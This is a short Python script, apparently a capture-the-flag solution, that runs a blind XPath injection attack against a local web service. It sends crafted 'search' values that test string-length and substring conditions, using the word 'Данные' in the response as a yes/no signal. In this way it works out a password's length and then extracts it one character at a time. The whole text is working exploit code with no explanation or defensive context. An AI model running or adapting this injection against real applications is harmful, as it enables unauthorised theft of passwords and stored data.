import requests, string 

flag = ""
l = 0
alphabet = string.ascii_letters + string.digits + "{}_()"
for i in range(30): 
    r = requests.post("http://127.0.0.1:8001", data={'search': "' or string-length(text())=" + str(i) + " and 'a'='a"})
    if "Данные" in r.text:
        l = i 
        break 
print("[+] Password length: " + str(l)) 
for i in range(1, l + 1):
    for al in alphabet: 
        r = requests.post("http://127.0.0.1:8001", data={'search': "' or substring(text(), " + str(i) + ",1)='" + al + "' and 'a'='a"})
        if "Данные" in r.text:
            flag += al
            print("[+] Flag: " + flag)
            break
